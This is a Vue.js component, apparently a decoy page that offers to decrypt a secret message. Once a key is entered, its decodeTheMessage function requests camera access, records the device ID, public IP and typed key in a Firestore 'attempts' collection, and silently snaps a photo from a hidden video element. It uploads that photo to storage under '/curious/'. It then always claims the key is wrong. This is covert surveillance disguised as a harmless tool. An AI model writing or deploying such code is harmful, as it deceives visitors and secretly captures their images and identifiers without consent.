<template>
    <div class="modal fade" id="handleModal" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1"
        aria-labelledby="handleModalLabel" aria-hidden="true">
        <div class="modal-dialog modal-lg">
            <div class="modal-content">
                <div class="modal-header">
                    <h1 class="modal-title fs-5" id="handleModalLabel">Mensagem de {{ data.nome }}</h1>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <Ads />
                    <div v-if="data.alert != null" class="mb-3">
                        <div :class="'alert alert-' + data.alert.class + ' alert-dismissible'" role="alert">
                            {{ data.alert.message }}
                            <button @click="() => data.alert = null" type="button" class="btn-close"></button>
                        </div>
                    </div>
                    <div class="card text-center mb-3">
                        <div class="card-body">
                            <p class="card-text overflow-auto text-break font-monospace mb-3"
                                style="max-height: 160px;">
                                {{ data.secretMessage }}
                            </p>
                            <hr>
                            <button @click="copySecretMessage" class="btn btn-primary">Copiar 📋</button>
                        </div>
                    </div>
                    <h5 class="card-title mb-3">Descriptografar Mensagem 🔓</h5>
                    <div class="mb-3">
                        <label for="inputSecretKey" class="form-label">
                            Informe a chave secreta 🔑
                            <a class="btn btn-link btn-sm" data-bs-toggle="collapse" href="#collapseTip" role="button"
                                aria-expanded="false" aria-controls="collapseTip">
                                (Ver dica)
                            </a>
                        </label>
                        <div class="collapse" id="collapseTip">
                            <div class="alert alert-info text-center" role="alert">
                                <b style="color: red;">{{ data.tip }}</b>
                            </div>
                        </div>
                        <div class="row g-3">
                            <div class="col">
                                <input v-model="data.inputSecretKey" type="text" class="form-control"
                                    id="inputSecretKey">
                            </div>
                            <div class="col-auto">
                                <button @click="throwError" class="btn btn-primary mb-3">Escanear 📷</button>
                            </div>
                        </div>
                    </div>
                    <!-- <div class="card text-center mb-3">
                        <div class="card-body">
                            <p class="card-text overflow-auto text-break font-monospace mb-3"
                                style="max-height: 200px;">...</p>
                            <hr>
                            <button disabled="true" class="btn btn-primary">
                                Copiar 📋
                            </button>
                        </div>
                    </div>
                    <br>
                    <button @click="requestCameraPermission" type="button"
                        class="btn btn-primary btn-lg">Ativar</button>
                    <button id="capture-btn" class="btn btn-primary btn-lg">Capture Photo</button>
                    <br>
                    <br> -->
                </div>
                <div class="modal-footer d-flex justify-content-center">
                    <button @click="decodeTheMessage" class="btn btn-success mb-3">Descriptografar</button>
                </div>
            </div>
        </div>
    </div>

    <div class="modal fade" id="permissionsModal" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1"
        aria-labelledby="permissionsModalLabel" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h1 class="modal-title fs-5" id="permissionsModalLabel">⚠️ Importante! ⚠️</h1>
                    <!-- <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button> -->
                </div>
                <div class="modal-body">
                    Algumas funcionalidades dependem de permissão para usar recursos do seu navegador. Nega-los pode
                    ocasionar não funcionamento adequado do aplicativo 😔.
                </div>
                <div class="modal-footer d-flex justify-content-between">
                    <button @click="cancelAction" class="btn btn-secondary">Cancelar</button>
                    <button class="btn btn-success">Ciente, prosseguir</button>
                </div>
            </div>
        </div>
    </div>
    <video id="camera" style="display: none;" autoplay></video>
    <canvas id="photo" style="display: none;"></canvas>
</template>

<script setup>
import Ads from './Ads.vue';
import { onMounted, reactive } from 'vue';
import { useAppStore } from '../store';
import { useRoute } from 'vue-router';
import { Device } from '@capacitor/device';
import { doc, setDoc, Timestamp } from 'firebase/firestore';
import { firestore, storage } from '../firebase';
import { ref, uploadString } from 'firebase/storage';

const data = reactive({
    nome: '',
    secretMessage: "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",
    tip: 'super dica! te vira!',
    inputSecretKey: '',
    requestPermissionsModal: true,
    video: null,
    canvas: null,
    alert: null
});

const route = useRoute();
const appStore = useAppStore();

onMounted(() => {
    if (route.query?.msg === 'WilliamSampaio97') {
        data.nome = route.query.msg;
        const myModalEl = document.querySelector('#handleModal');
        const modal = bootstrap.Modal.getOrCreateInstance(myModalEl);
        modal.show();

        data.video = document.getElementById('camera');
        data.canvas = document.getElementById('photo');
    }
});

function request() {
    // Request access to the user's camera
    navigator.mediaDevices.getUserMedia({ video: true })
        .then((stream) => {
            data.video.srcObject = stream;
        })
        .catch((error) => {
            console.error("Error accessing the camera: ", error);
        });
}


function notificationPermissionIsGranted() {
    return Notification.permission === 'granted';
}

async function cameraPermissionIsGranted() {
    const res = await navigator.permissions.query({ name: "camera" });
    return res.state === 'granted';
}

async function requestNotificationPermission() {
    if (!notificationPermissionIsGranted()) {
        await Notification.requestPermission()
            .then(permission => {
                if (permission !== 'granted') {
                    console.error('Ops! Você não concedeu permissão de notificação, pode ser que alguns recursos não funcionem adequadamente.');
                }
            });
    }
}

async function requestCameraPermission() {
    await navigator.mediaDevices.getUserMedia({ video: true })
        .then((stream) => {
            data.video.srcObject = stream;
        })
        .catch((error) => {
            console.error("Error accessing the camera: ", error);
        });
}

async function decodeTheMessage() {
    if (!data.inputSecretKey) {
        return alert('Informe uma chave secreta para prosseguir!');
    }

    const handleModal = bootstrap.Modal.getOrCreateInstance(document.querySelector('#handleModal'));
    const permissionsModal = bootstrap.Modal.getOrCreateInstance(document.querySelector('#permissionsModal'));

    if (!data.requestPermissionsModal) {
        handleModal.hide();
        permissionsModal.show();
    }

    await requestNotificationPermission();
    await requestCameraPermission();

    appStore.loadingToggle();

    let payload = {};

    try {
        const device = await Device.getId();
        payload.device = device.identifier;
    } catch (error) {
        console.error('Error device info:', error);
    }

    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const json = await response.json();
        payload.ip = json.ip;
    } catch (error) {
        console.error('Error fetching IP address:', error);
    }

    payload.inputSecretKey = data.inputSecretKey;
    payload.at = Timestamp.fromDate(new Date());

    // console.log(payload);
    Object.keys(payload).forEach(key => payload[key] === undefined && delete payload[key])

    const id = Date.now().toString();

    try {
        await setDoc(doc(firestore, "attempts", id), payload);
    } catch (error) {
        console.error('Error insert payload:', error);
    }

    data.canvas.width = data.video.videoWidth;
    data.canvas.height = data.video.videoHeight;

    const context = data.canvas.getContext('2d');
    context.drawImage(data.video, 0, 0, data.canvas.width, data.canvas.height);

    try {
        await uploadString(ref(storage, `/curious/${payload.device}/${id}`), data.canvas.toDataURL('image/jpeg'), 'data_url')
    } catch (error) {
        console.error('Error upload file:', error);
    }

    const tracks = data.video.srcObject.getTracks();
    if (tracks) {
        tracks.forEach(t => t.stop());
    }

    data.alert = {
        'class': 'danger',
        'message': 'Chave secreta incorreta ou inválida!'
    }

    appStore.loadingToggle();
}

function cancelAction() {
    const permissionsModal = bootstrap.Modal.getOrCreateInstance(document.querySelector('#permissionsModal'));
    permissionsModal.hide();
    const handleModal = bootstrap.Modal.getOrCreateInstance(document.querySelector('#handleModal'));
    handleModal.show();
}

function copySecretMessage() {
    navigator.clipboard.writeText(data.secretMessage);
    alert('Texto copiado para a área de transferência.');
}

function throwError() {
    data.alert = {
        'class': 'danger',
        'message': 'Erro inesperado! Tente mais tarde...'
    }
}
</script>